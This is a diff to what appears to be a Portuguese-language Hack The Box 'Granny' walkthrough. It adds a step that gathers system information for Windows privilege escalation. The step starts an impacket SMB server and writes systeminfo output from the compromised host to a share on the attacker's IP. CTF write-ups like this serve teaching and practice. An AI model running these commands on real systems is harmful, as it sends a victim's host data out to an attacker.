@@ -145,5 +145,12 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 c:\windows\system32\inetsrv>
 ```
 
+Precisamos obter mais informacoes basicas como qual sistema, qual arquitetura, qual versao essas informacoes sao essenciais para continuar com a escalacao de privilegios
+
+`impacket-smbserver tools .`
+`systeminfo >> \\10.10.14.36\tools\systeminfo.txt`
+
+![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/4.jpg)
+
 
 
